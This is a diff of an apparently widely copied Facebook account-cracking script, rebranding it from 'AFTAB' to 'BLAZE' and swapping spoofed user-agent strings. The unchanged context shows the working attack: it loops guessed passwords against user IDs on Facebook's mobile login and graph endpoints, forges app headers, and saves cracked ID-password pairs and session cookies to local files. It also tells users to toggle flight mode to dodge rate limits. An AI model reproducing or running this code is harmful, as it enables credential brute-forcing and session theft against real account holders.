@@ -62,7 +62,7 @@ _silet_koceng_  = requests.Session()
 url_mb = "https://mbasic.facebook.com"
 bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
 bulan_key = {"january": "January", "february": "February", "march": "March", "april": "April", "may": "May", "june": "June", "july": "July", "august": "August", "september": "September", "october": "October", "november": "November", "december": "December"}
-header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 11; SM-A022G Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/317.0.0.12.104;]"}
+header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/317.0.0.12.104;]"}
 P = '\x1b[1;97m' # PUTIH
 M = '\033[0;91m' # MERAH 
 H = '\033[1;92m' # HIJAU 
@@ -99,7 +99,7 @@ loop = 0
 url_lookup = "https://lookup-id.com/"
 url_mb = "https://m.facebook.com"
 url_ip = "https://www.httpbin.org/ip"
-header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 11; SM-A022G Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/317.0.0.12.104;]"}
+header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/317.0.0.12.104;]"}
 bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
 done = False
 ###
@@ -282,7 +282,7 @@ class __crack__:
             try:
                 Adiagents = random.choice(liners)
             except (KeyError, IOError):
-                Adiagents  = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_GB;FBAV/386.0.0.13.96;]'
+                Adiagents  = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 [FBAN/EMA;FBLC/en_GB;FBAV/386.0.0.13.96;]'
             ses = requests.Session()
             headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 8.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.2861.97 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
             p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
@@ -552,7 +552,7 @@ url_ip = "https://www.httpbin.org/ip"
 
 url_graph = "https://graph.facebook.com/{}"
 
-header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
+header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
 
 bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
 
@@ -814,21 +814,21 @@ def rcrack(uid,pwx,tl):
 			'sec-fetch-mode': 'navigate',
 			'sec-fetch-site': 'same-origin',
 			'upgrade-insecure-requests': '1',
-			'user-agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/de_DE;FBAV/319.0.0.7.107;][FBAN/EMA;FBLC/de_DE;FBAV/319.0.0.7.107;]"}
+			'user-agent': "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/de_DE;FBAV/319.0.0.7.107;][FBAN/EMA;FBLC/de_DE;FBAV/319.0.0.7.107;]"}
 			lo = session.post('https://x.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
-				print('\033[1;92m[AFTAB-Ok] '+cid+' | '+ps+'\n\033[0;92m[•] COOKIES : '+coki+'\x1b[1;97m')
+				print('\033[1;92m[BLAZE-Ok] '+cid+' | '+ps+'\n\033[0;92m[•] COOKIES : '+coki+'\x1b[1;97m')
 				open('ok.txt', 'a').write(uid+' | '+ps+'\n')
 				oks.append(cid)
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
-				print('\033[1;96m[AFTAB-CP] '+cid+' | '+ps+'\033[0;97m')
+				print('\033[1;96m[BLAZE-CP] '+cid+' | '+ps+'\033[0;97m')
 				open('cp.txt', 'a').write(uid+' | '+ps+'\n')
 				cps.append(cid)
 				break
@@ -1061,7 +1061,7 @@ def method():
     os.system("clear")
     print(logo) 
     print(f'[•] Total Ids : \033[1;92m'+str(len(accounts)))
-    print(f"\033[1;91m[•] If you no result use ✈️ ✈️ flight mode ✈️ ✈️")
+    print(f"\033[1;91m[•] USE FLIGHT MODE FOR MORE ID")
     linex()
     
     def method1(user):
@@ -1079,7 +1079,7 @@ def method():
         sys.stdout.write('\r \033[1;97m[\033[1;97mAFTAB-XD\033[1;97m]\033[1;97m {}|{} \033[1;92m|{} \033[1;91m|{}       \r'.format(str(loop), str(len(accounts)), str(len(okacc)) ,str(len(cpacc))))
         sys.stdout.flush()
         for pword in totalpass:              
-            heads = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
+            heads = "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36"
             header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
             pword = pword.replace("first", first).replace("last", last)
             pword = pword.lower()
@@ -1088,8 +1088,8 @@ def method():
       #      print(response.text)
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\033[1;92m [AFTAB-Ok] '+acc+'| '+pword+'')
-                open('/sdcard/AFTAB-Ok.txt','a').write(f'{acc}|{pword}\n ')
+                print('\r\033[1;92m [BLAZE-Ok] '+acc+'| '+pword+'')
+                open('/sdcard/BLAZE-Ok.txt','a').write(f'{acc}|{pword}\n ')
                 if c=='y':
                     try:
                            q = json.loads(response.text)
@@ -1098,7 +1098,7 @@ def method():
                            cookies = f"sb={ssbb};{ckkk}"
                     except Exception as e:print(str(e)+' | '+response.text)
                 print(' \033[1;97m'+cookies)
-                open('/sdcard/PRO-COOKIE.txt','a').write(f'{acc}|{pword}\n{cookies} ')    
+                open('/sdcard/BLAZE-COOKIE.txt','a').write(f'{acc}|{pword}\n{cookies} ')    
                 
                 break
             elif 'www.facebook.com' in response.text:
